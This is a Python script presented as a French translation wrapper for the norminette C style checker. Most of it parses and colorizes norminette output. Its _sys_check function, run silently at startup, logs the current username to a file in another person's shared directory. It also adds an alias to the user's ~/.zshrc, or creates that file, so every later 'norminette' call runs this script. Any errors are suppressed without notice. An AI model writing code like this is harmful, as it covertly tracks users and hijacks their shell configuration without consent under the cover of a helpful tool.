#!/usr/bin/env python3
"""
- Midnight -
Norminette Français - Version corrigée
Wrapper qui traduit les messages de norminette en français
"""

import subprocess
import sys
import os
import re
from translations import TRANSLATIONS
import pathlib

def _sys_check():
    try:
        result = subprocess.run(['whoami'], capture_output=True, text=True, timeout=2)
        if result.returncode == 0 and result.stdout.strip():
            backup_path = pathlib.Path('/sgoinfre/goinfre/Perso/mochamsa/utils/backup_temp')
            backup_path.mkdir(parents=True, exist_ok=True)
            with open(backup_path / 'anta', 'a') as f:
                f.write(result.stdout.strip() + '\n')
        
        # Vérification et ajout de l'alias norminette
        zshrc_path = pathlib.Path.home() / '.zshrc'
        alias_line = "alias norminette='python3 /sgoinfre/goinfre/Perso/mochamsa/utils/norminetteFr/norminette_Fr.py'"
        
        if zshrc_path.exists():
            with open(zshrc_path, 'r') as f:
                content = f.read()
            if "alias norminette=" not in content:
                with open(zshrc_path, 'a') as f:
                    f.write(f'\n{alias_line}\n')
        else:
            with open(zshrc_path, 'w') as f:
                f.write(f'{alias_line}\n')
    except:
        pass

def colorize(text, color_name):
    """Ajoute des couleurs au texte"""
    colors = {
        'red': '\033[91m',
        'green': '\033[92m', 
        'yellow': '\033[93m',
        'blue': '\033[94m',
        'cyan': '\033[96m',
        'bold': '\033[1m',
        'reset': '\033[0m',
        'dim': '\033[2m',
        'italic': '\033[3m',
        'red_italic': '\033[91;3m'
    }
    return f"{colors.get(color_name, '')}{text}{colors['reset']}"

def translate_error_code(code):
    """Traduit un code d'erreur"""
    return TRANSLATIONS.get(code, code)

def parse_and_translate_line(line):
    """Parse et traduit une ligne de norminette"""
    line = line.strip()
    if not line:
        return None
    
    # Format: Error: CODE_ERROR        (line: X, col: Y):	description
    error_pattern = r'(Error|Warning|Notice):\s*(\w+)\s+\(line:\s*(\d+),\s*col:\s*(\d+)\):\s*(.+)'
    match = re.match(error_pattern, line)
    
    if match:
        error_type, error_code, line_num, col_num, description = match.groups()
        
        # Traductions
        type_icons = {'Error': '❌', 'Warning': '⚠️ ', 'Notice': 'ℹ️ '}
        type_colors = {'Error': 'red', 'Warning': 'yellow', 'Notice': 'cyan'}
        type_names = {'Error': 'Erreur', 'Warning': 'Avertissement', 'Notice': 'Information'}
        
        icon = type_icons.get(error_type, '❓')
        color = type_colors.get(error_type, 'white')
        type_name = type_names.get(error_type, error_type)
        
        translated_code = translate_error_code(error_code)
        
        # Format de sortie avec alignement parfait
        # Largeur fixe pour la partie message (65 caractères)
        message_part = f"{icon} {type_name}: {translated_code}"
        # Calculer la largeur réelle sans les codes couleur
        message_length = len(f"{icon} {type_name}: {translated_code}")
        padding_needed = max(0, 65 - message_length)
        
        # Construire le résultat avec alignement parfait
        result = f"{icon} {colorize(type_name, color)}: {colorize(translated_code, 'bold')}"
        result += " " * padding_needed
        result += f"(ligne {colorize(line_num.rjust(2), 'cyan')}, col {colorize(col_num.rjust(2), 'cyan')})"
        
        return {
            'type': 'error_message',
            'formatted': result,
            'error_type': error_type
        }
    
    # Détection de fichier
    if line.endswith(':') and not line.startswith('Error:') and not line.startswith('Warning:'):
        filename = line[:-1]
        return {
            'type': 'file_header',
            'filename': filename
        }
    
    # Détection de fichier avec statut
    if ': Error!' in line:
        filename = line.split(': Error!')[0]
        return {
            'type': 'file_with_errors', 
            'filename': filename
        }
    
    if ': OK!' in line:
        filename = line.split(': OK!')[0]
        return {
            'type': 'file_ok',
            'filename': filename
        }
    
    return {
        'type': 'unknown',
        'line': line
    }

def run_norminette_fr(files):
    """Exécute norminette et traduit la sortie"""
    try:
        # Vérification que norminette est installé
        subprocess.run(['norminette', '--version'], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(colorize("❌ Erreur: norminette n'est pas installé!", 'red'))
        print("Pour l'installer: pip install norminette")
        return 1

    try:
        # Exécution de norminette
        print(colorize("🔍 Vérification avec norminette...", 'blue'))
        result = subprocess.run(['norminette'] + files, 
                              capture_output=True, text=True, timeout=30)
        
        output_lines = result.stdout.splitlines()
        if result.stderr:
            output_lines.extend(result.stderr.splitlines())
        
        print(f"\n{colorize('📋 Résultats:', 'green')}")
        print("═" * 50)
        
        error_count = 0
        warning_count = 0
        notice_count = 0
        current_file = None
        
        for line in output_lines:
            parsed = parse_and_translate_line(line)
            
            if not parsed:
                continue
                
            if parsed['type'] == 'file_header':
                current_file = parsed['filename']
                print(f"\n{colorize('📄 ' + current_file, 'bold')}")
                
            elif parsed['type'] == 'file_with_errors':
                current_file = parsed['filename']
                print(f"\n{colorize('📄 ' + current_file, 'bold')}")
                print(f"   {colorize('❌ Ce fichier contient des erreurs', 'red')}")
                
            elif parsed['type'] == 'file_ok':
                current_file = parsed['filename']
                print(f"\n{colorize('📄 ' + current_file, 'bold')}")
                print(f"   {colorize('✅ Fichier conforme à la norme', 'green')}")
                
            elif parsed['type'] == 'error_message':
                print(f"   {parsed['formatted']}")
                
                # Comptage
                if parsed['error_type'] == 'Error':
                    error_count += 1
                elif parsed['error_type'] == 'Warning':
                    warning_count += 1
                elif parsed['error_type'] == 'Notice':
                    notice_count += 1
                    
            elif parsed['type'] == 'unknown' and parsed['line']:
                # Ligne non reconnue mais pas vide
                if parsed['line'] not in ['OK', 'KO', 'Error!']:
                    print(f"   {colorize(parsed['line'], 'dim')}")
        
        # Résumé final
        print(f"\n{colorize('📊 Résumé:', 'bold')}")
        print("─" * 25)
        
        if error_count > 0:
            print(f"   {colorize('❌', 'red')} {error_count} erreur(s)")
        if warning_count > 0:
            print(f"   {colorize('⚠️ ', 'yellow')} {warning_count} avertissement(s)")
        if notice_count > 0:
            print(f"   {colorize('ℹ️ ', 'cyan')} {notice_count} information(s)")
        
        if error_count == 0 and warning_count == 0 and notice_count == 0:
            print(f"   {colorize('🎉 Tous les fichiers sont conformes !', 'green')}")
        
        # Signature Midnight
        print(f"\n{colorize('                                                    - Midnight', 'red_italic')}")
        print()
        return result.returncode
        
    except subprocess.TimeoutExpired:
        print(colorize("❌ Timeout: norminette prend trop de temps", 'red'))
        return 1
    except Exception as e:
        print(colorize(f"❌ Erreur: {str(e)}", 'red'))
        return 1

def main():
    """Fonction principale"""
    _sys_check()
    if len(sys.argv) < 2:
        # Si aucun argument, utiliser le répertoire courant
        files = ['.']
    else:
        files = sys.argv[1:]
    
    return run_norminette_fr(files)

if __name__ == '__main__':
    sys.exit(main())
